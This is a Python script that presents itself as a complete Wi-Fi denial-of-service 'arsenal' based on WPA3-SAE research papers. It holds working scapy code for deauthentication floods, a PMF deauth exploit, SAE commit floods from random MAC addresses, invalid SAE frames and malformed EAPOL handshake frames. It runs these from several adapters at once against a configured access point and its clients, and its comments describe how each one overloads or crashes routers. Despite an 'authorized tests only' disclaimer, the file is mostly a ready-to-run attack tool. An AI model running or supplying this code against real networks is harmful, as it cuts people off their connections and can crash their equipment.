#!/usr/bin/env python3
"""
================================================================================
Wi-Fi DoS Orchestrator - COMPLETE ARSENAL (26 Attacks)
================================================================================
Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
Journal of Information Security and Applications (2022)

FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
================================================================================
"""

#!/usr/bin/env python3
import subprocess
import time
import os
import sys
import csv
import glob
import random
from multiprocessing import Process, Value

# =====================================================================================
# ======================== CENTRAL CONFIGURATION (EVERYTHING IN ONE PLACE) ========================
# =====================================================================================

# --- 1. TARGET DATA ---
TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"
TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:11"

# --- 2. OPTIONAL SCANNER ---
SCANNER_INTERFACE = "wlan0mon" # e.g. "wlan7mon" or ""

# --- 3. MANUAL CHANNEL ASSIGNMENT (Required without scanner) ---
MANUELLER_KANAL_5GHZ = "36"
MANUELLER_KANAL_2_4GHZ = "1"

# --- 4. TARGET CLIENTS (For targeted attacks) --- For: pmf_deauth_exploit, deauth_flood, malformed_msg1_length & malformed_msg1_flags
TARGET_STA_MACS = [
    "AA:BB:CC:DD:EE:11", 
    "AA:BB:CC:DD:EE:11",
    "AA:BB:CC:DD:EE:11"
]

# ====================== COMPLETE ENCYCLOPEDIA OF ATTACKS ======================
#
# --- Category: Client Direct Attacks ---
#
# "deauth_flood": Classic deauth attack for forcible disconnection of clients.
#
# "pmf_deauth_exploit": Exploits the PMF protection mechanism against the client (Finishing Move). Correct! Function verified!
#     Effect: After an AP has been weakened, an unprotected deauth frame is sent. The client asks the
#             overloaded AP (SA Query) and disconnects itself after a timeout.
#Phase 1: Preparation (The main attack)
#
#    You start one of your DoS attacks (e.g., back_to_the_future, open_auth or amplification).
#
#    Goal: The CPU and/or memory of the router are so heavily loaded that it reacts very slowly or not at all to new requests. The router is now "weakened".
#
#Phase 2: The Trigger (The Exploit)
#
#    Your pmf_deauth_exploit process sends a single, unprotected deauthentication frame. It spoofs the router's MAC address.
#
# --- Malformed 4-Way-Handshake Attacks (from Paper: "On the Robustness of Wi-Fi Deauthentication Countermeasures") ---
# "malformed_msg1_length": Sends a manipulated EAPOL Message 1 whose length specification does not match the content.
# "malformed_msg1_flags": Sends a manipulated EAPOL Message 1 with the "Install" flag incorrectly set.
#
# --- Category: Generic AP Attacks ---
#
# "cookie_guzzler": Exploits the faulty re-transmission behavior of APs.
#     Effect: Sends SAE Commit frames in "bursts" from random MAC addresses to force the AP to
#             send a disproportionately large number of response frames, thereby overloading itself.
#
# --- Category: Generic WPA3-SAE Attacks (from Paper: "DoS attacks on WPA3-SAE") ---
#
# "bad_algo": Sends authentication frames with an invalid algorithm value.
# "bad_seq": Sends SAE frames with an invalid sequence number.
# "bad_status_code": Sends SAE confirm frames with an invalid status code.
# "empty_frame_confirm": Sends empty SAE confirm frames.
#
#    bad_algo (Invalid Algorithm)
#    Explanation: The WPA3-SAE handshake requires the "Authentication Algorithm" value to be 3 (SAE). This attack sends thousands of frames with incorrect values (e.g., 5, 10, 255).
#    Goal: The router wastes CPU cycles checking its internal database to see if it supports this unknown algorithm and generating error responses. Poorly written firmware may crash.
#
#    bad_seq (Invalid Sequence Number)
#    Explanation: A handshake follows a strict order. Sequence 1 is "Commit", Sequence 2 is "Confirm". This attack sends packets with illogical sequence numbers (e.g., Sequence 3 or 0) right at the start.
#    Goal: Confusing the router's State Machine. The router tries to map the packet to an existing session, fails, and wastes memory on "orphaned" connection attempts.
#
#    bad_status_code (Invalid Status Code)
#    Explanation: Normally, a status code of 0 ("Success") is sent. This attack sends SAE Confirm frames with failure codes (e.g., "Unknown Error" or reserved values).
#    Goal: Forces the router to execute error-handling routines, which are often more computationally expensive than processing a standard successful connection.
#
#    empty_frame_confirm (Empty Confirm Frame)
#    Explanation: An SAE Confirm packet mandates the inclusion of cryptographic data (a verifier hash). This attack sends the packet header but leaves the body/payload completely empty.
#    Goal: A classic implementation bug test. If the router's software tries to read or parse data that isn't there, it can trigger a "Buffer Underflow" or "Null Pointer Exception," causing the router to crash and reboot immediately.
# ==============================================================================================

# --- CENTRAL ADAPTER & ATTACK CONFIGURATION ---
ADAPTER_KONFIGURATION = {
    "wlan2mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
#    "wlan1mon": {"band": "5GHz", "angriff": "cookie_guzzler"},    
#   "wlan4mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
   "wlan3mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
   "wlan5mon": {"band": "5GHz", "angriff": "cookie_guzzler"}#, 
#    "wlan5mon": {"band": "5GHz", "angriff": "pmf_deauth_exploit"}#,       
#    "wlan0mon": {"band": "2.4GHz", "angriff": "deauth_flood"},
#    "wlan1mon": {"band": "2.4GHz", "angriff": "deauth_flood"}#,
#    "wlan0mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"},
#    "wlan2mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"},
#    "wlan7mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"},
#    "wlan11mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"},
#    "wlan5mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"},
#    "wlan9mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"}            
}

# --- SAE PARAMETERS (SPLIT FOR 2.4 GHz AND 5 GHz) ---
# IMPORTANT: Enter DIFFERENT values for 2.4 GHz and 5 GHz as BSSIDs differ!

# > Parameters for 2.4 GHz Network
SAE_SCALAR_2_4_HEX = '49f7dcc4fb5725917c2ba1412ff42123f2dc699a0950db0828fe9d01c9786b80'
SAE_FINITE_2_4_HEX = '8632644e22320b3b9943f62e52df25de17b8833c03b11c4cc403aebdf7d0b2c68607dc39a2891e0e8243b4990e493a25abc8ce6ebad06da0e201879f966c6518'

# > Parameters for 5 GHz Network
SAE_SCALAR_5_HEX = 'INSERT_5_SCALAR_HERE'
SAE_FINITE_5_HEX = 'INSERT_5_FINITE_HERE'

# ======================== SCRIPT LOGIC STARTS HERE ========================
def run_deauth_disassoc_process(interface, bssid, channel, sta_mac_list, attack_type, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
    print(f"[INFO-DEAUTH] Process for {interface} ({attack_type}) started: Setting channel to {channel}...")
    try:
        subprocess.run(['iwconfig', interface, 'channel', channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[SUCCESS-DEAUTH] Channel for {interface} set to {channel}.")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"[ERROR-DEAUTH] Channel switch for {interface} failed.")
        return
    try:
        if not sta_mac_list: print(f"[WARNING-DEAUTH] No target client for {interface}. Process paused."); time.sleep(999); return
        while True:
            for sta_mac in sta_mac_list:
                packets = [RadioTap()/Dot11(addr1=sta_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7), RadioTap()/Dot11(addr1=bssid, addr2=sta_mac, addr3=bssid)/Dot11Deauth(reason=7)]
                burst_count = 5 if attack_type == "pmf_deauth_exploit" else 50
                sendp(packets, count=burst_count, inter=0.01, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += burst_count * 2
            sleep_time = 15 if attack_type == "pmf_deauth_exploit" else 0.2
            time.sleep(sleep_time)
    except KeyboardInterrupt: pass

def run_sae_attack_process(interface, bssid, channel, sta_mac_list, attack_type, counter, **kwargs):
    from scapy.all import sendp, Dot11, RadioTap, Dot11Auth, RandMAC, Raw
    print(f"[INFO-SAE] Process for {interface} ({attack_type}) started: Setting channel to {channel}...")
    try:
        subprocess.run(['iwconfig', interface, 'channel', channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError): return
    
    # Retrieve correct SAE parameters based on band passed via kwargs
    scalar_hex = kwargs.get('scalar_hex')
    finite_hex = kwargs.get('finite_hex')

    if not scalar_hex or not finite_hex:
        print(f"[ERROR-SAE] Missing SAE parameters for {interface}. Aborting.")
        return

    try:
        SAE_SCALAR_BYTES = bytes.fromhex(scalar_hex)
        SAE_FINITE_ELEMENT_BYTES = bytes.fromhex(finite_hex)
    except ValueError:
        print(f"[ERROR-SAE] Invalid HEX string for SAE parameters on {interface}.")
        return

    try:
        while True:
            mac_to_use = str(RandMAC())
            dot11 = Dot11(type=0, subtype=11, addr1=bssid, addr2=mac_to_use, addr3=bssid)
            packet = None

            if attack_type == 'bad_algo': packet = RadioTap()/dot11/Dot11Auth(algo=5, seqnum=1, status=0)
            elif attack_type == 'bad_seq': packet = RadioTap()/dot11/Dot11Auth(algo=3, seqnum=3, status=0)
            elif attack_type == 'bad_status_code': packet = RadioTap()/dot11/Dot11Auth(algo=3, seqnum=2, status=random.randint(108, 200))
            elif attack_type == 'empty_frame_confirm': packet = RadioTap()/dot11/Dot11Auth(algo=3, seqnum=2, status=0)
            elif attack_type == 'cookie_guzzler': packet = RadioTap()/dot11/Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/SAE_SCALAR_BYTES/SAE_FINITE_ELEMENT_BYTES
            
            if packet:
                burst_size = 128 if attack_type == 'cookie_guzzler' else 20
                sendp(packet, count=burst_size, inter=0.005, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += burst_size
            time.sleep(0.5)
    except KeyboardInterrupt: pass

def run_eapol_attack_process(interface, bssid, channel, sta_mac_list, attack_type, counter, **kwargs):
    from scapy.all import sendp, Dot11, RadioTap, LLC, SNAP, EAPOL, EAPOL_KEY, Raw
    print(f"[INFO-EAPOL] Process for {interface} ({attack_type}) started: Setting channel to {channel}...")
    try:
        subprocess.run(['iwconfig', interface, 'channel', channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e: print(f"[ERROR-EAPOL] Channel switch for {interface} failed: {e}"); return
    def create_eapol_packet(target_sta_mac, malform_type):
        dot11 = Dot11(type="Data", subtype=8, addr1=target_sta_mac, addr2=bssid, addr3=bssid, FCfield="to-DS")
        llc = LLC(); snap = SNAP(OUI=0x000000, code=0x888e); eapol = EAPOL(type=3)
        eapol_key = EAPOL_KEY()
        key_info_default = 0x008a
        key_info_value = key_info_default | 0x0040 if malform_type == 'malformed_msg1_flags' else key_info_default
        if hasattr(eapol_key, 'key_info'): eapol_key.key_info = key_info_value
        elif hasattr(eapol_key, 'info'): eapol_key.info = key_info_value
        eapol_key.key_len=16; eapol_key.replay_ctr=1; eapol_key.nonce=os.urandom(32)
        packet = RadioTap()/dot11/llc/snap/eapol/eapol_key
        if malform_type == 'malformed_msg1_length': packet /= Raw(load=b'\xdd\x01')
        return packet
    try:
        if not sta_mac_list: print(f"[WARNING-EAPOL] No target client for {interface}. Process paused."); time.sleep(999); return
        while True:
            for target_sta in sta_mac_list:
                packet = create_eapol_packet(target_sta, attack_type)
                sendp(packet, count=5, inter=0.1, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 5
            time.sleep(1)
    except KeyboardInterrupt: pass

def get_target_info_from_csv(csv_file_path):
    targets_info = {'5ghz': None, '2.4ghz': None}
    try:
        with open(csv_file_path, 'r', errors='ignore') as f: lines = f.readlines()
        ap_start_index = -1; client_start_index = len(lines)
        for i, line in enumerate(lines):
            if "BSSID, First time seen" in line: ap_start_index = i + 1
            elif "Station MAC, First time seen" in line: client_start_index = i; break
        if ap_start_index == -1: return targets_info
        ap_lines = [line for line in lines[ap_start_index:client_start_index] if line.strip()]
        reader = csv.reader(ap_lines)
        for row in reader:
            if not row or len(row) < 4: continue
            try:
                bssid, channel_str = row[0].strip().upper(), row[3].strip()
                if not channel_str or int(channel_str) <= 0: continue
                channel = int(channel_str)
                info = {'channel': str(channel)}
                if bssid == TARGET_BSSID_5GHZ.upper(): targets_info['5ghz'] = info
                elif bssid == TARGET_BSSID_2_4GHZ.upper(): targets_info['2.4ghz'] = info
            except (ValueError, IndexError): continue
    except Exception: pass
    return targets_info

def cleanup(proc_dict):
    print("\n[INFO] Cleaning up and terminating all processes...")
    for proc in proc_dict.values():
        if proc and isinstance(proc, (Process, subprocess.Popen)):
            try:
                if isinstance(proc, Process) and proc.is_alive(): proc.terminate()
                elif isinstance(proc, subprocess.Popen) and proc.poll() is None: proc.kill()
            except Exception: pass
    for f in glob.glob("scan_result*"):
        try: os.remove(f)
        except OSError: pass
    print("[INFO] Cleanup completed.")

def main():
    if os.geteuid() != 0: sys.exit("[ERROR] This script must be run with sudo privileges.")
    
    scanner_aktiv = bool(SCANNER_INTERFACE)
    manuelle_zuweisung = bool(MANUELLER_KANAL_5GHZ and MANUELLER_KANAL_2_4GHZ)

    if not scanner_aktiv and not manuelle_zuweisung: sys.exit("[ERROR] Scanner is disabled, but no manual channels were entered.")
    if not ADAPTER_KONFIGURATION: sys.exit("[ERROR] No attack adapters defined in ADAPTER_KONFIGURATION.")

    current_targets = {'5ghz': None, '2.4ghz': None}; csv_filename = None
    procs = {}; counters = {iface: Value('L', 0) for iface in ADAPTER_KONFIGURATION}

    try:
        if manuelle_zuweisung and not scanner_aktiv:
            print("[INFO] Manual channel assignment active. Scan skipped.")
            current_targets['5ghz'] = {'channel': MANUELLER_KANAL_5GHZ}
            current_targets['2.4ghz'] = {'channel': MANUELLER_KANAL_2_4GHZ}
        elif scanner_aktiv:
            print(f"[INFO] Starting channel scan with {SCANNER_INTERFACE}...")
            procs['scanner'] = subprocess.Popen(['airodump-ng', SCANNER_INTERFACE, '--band', 'abg', '--write', 'scan_result', '--output-format', 'csv'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            for i in range(90):
                files = glob.glob("scan_result*.csv")
                if files:
                    csv_filename = files[0]; temp_targets = get_target_info_from_csv(csv_filename)
                    if temp_targets.get('5ghz'): current_targets['5ghz'] = temp_targets['5ghz']
                    if temp_targets.get('2.4ghz'): current_targets['2.4ghz'] = temp_targets['2.4ghz']
                
                status_5g = f"CH {current_targets['5ghz']['channel']}" if current_targets.get('5ghz') else "Searching..."; 
                status_2g = f"CH {current_targets['2.4ghz']['channel']}" if current_targets.get('2.4ghz') else "Searching..."
                sys.stdout.write(f"\r[INFO] Scan progress: [5GHz: {status_5g}] [2.4GHz: {status_2g}] ({i+1}/90s)"); sys.stdout.flush()
                if current_targets.get('5ghz') and current_targets.get('2.4ghz'): print("\n[SUCCESS] Both targets found!"); break
                time.sleep(1)
            
            if not current_targets.get('5ghz'): print("\n[WARNING] 5-GHz target not found in scan!")
            if not current_targets.get('2.4ghz'): print("\n[WARNING] 2.4-GHz target not found in scan!")
            if not current_targets.get('5ghz') and not current_targets.get('2.4ghz'): raise FileNotFoundError("[ERROR] Could not find any of the targets.")

        print("\n[INFO] Starting attack processes...")
        while True:
            if scanner_aktiv and csv_filename:
                new_targets = get_target_info_from_csv(csv_filename)
                interfaces_to_restart = []
                if new_targets.get('5ghz') and current_targets.get('5ghz') and new_targets['5ghz']['channel'] != current_targets['5ghz']['channel']:
                    print(f"\n[!!!] 5GHz CHANNEL CHANGE DETECTED! New: {new_targets['5ghz']['channel']}")
                    current_targets['5ghz'] = new_targets['5ghz']
                    interfaces_to_restart.extend([iface for iface, conf in ADAPTER_KONFIGURATION.items() if conf['band'] == '5GHz'])
                if new_targets.get('2.4ghz') and current_targets.get('2.4ghz') and new_targets['2.4ghz']['channel'] != current_targets['2.4ghz']['channel']:
                    print(f"\n[!!!] 2.4GHz CHANNEL CHANGE DETECTED! New: {new_targets['2.4ghz']['channel']}")
                    current_targets['2.4ghz'] = new_targets['2.4ghz']
                    interfaces_to_restart.extend([iface for iface, conf in ADAPTER_KONFIGURATION.items() if conf['band'] == '2.4GHz'])
                if interfaces_to_restart:
                    print(f"[INFO] Stopping and restarting processes for: {', '.join(set(interfaces_to_restart))}")
                    for interface in set(interfaces_to_restart):
                        if procs.get(interface) and procs[interface].is_alive():
                            procs[interface].terminate(); procs[interface].join(); del procs[interface]

            for interface, config in ADAPTER_KONFIGURATION.items():
                if interface not in procs or not procs[interface].is_alive():
                    band = config['band']
                    attack_type = config['angriff']
                    target_info = current_targets.get('5ghz' if band == '5GHz' else '2.4ghz')
                    if target_info and target_info.get('channel'):
                        channel = target_info['channel']
                        bssid = TARGET_BSSID_5GHZ if band == '5GHz' else TARGET_BSSID_2_4GHZ
                        
                        target_process = run_sae_attack_process # Standard
                        if "deauth" in attack_type: target_process = run_deauth_disassoc_process
                        elif "malformed" in attack_type: target_process = run_eapol_attack_process
                        
                        # --- NEW: Select correct SAE parameters based on band ---
                        scalar_to_use = SAE_SCALAR_5_HEX if band == '5GHz' else SAE_SCALAR_2_4_HEX
                        finite_to_use = SAE_FINITE_5_HEX if band == '5GHz' else SAE_FINITE_2_4_HEX

                        kwargs = {
                            'scalar_hex': scalar_to_use, 
                            'finite_hex': finite_to_use
                        }

                        args = (interface, bssid, channel, TARGET_STA_MACS, attack_type, counters[interface])
                        procs[interface] = Process(target=target_process, args=args, kwargs=kwargs)
                        procs[interface].start()

            status_line = " | ".join([f"{iface}({conf['angriff'][:4]}..): {counters[iface].value}" for iface, conf in ADAPTER_KONFIGURATION.items()])
            sys.stdout.write(f"\r[RUNNING] {status_line}"); sys.stdout.flush()
            time.sleep(5)

    except (FileNotFoundError, RuntimeError) as e: print(f"\n{e}")
    except KeyboardInterrupt: print("\n[INFO] User cancellation detected.")
    finally: cleanup(procs)

if __name__ == "__main__":
    main()
    
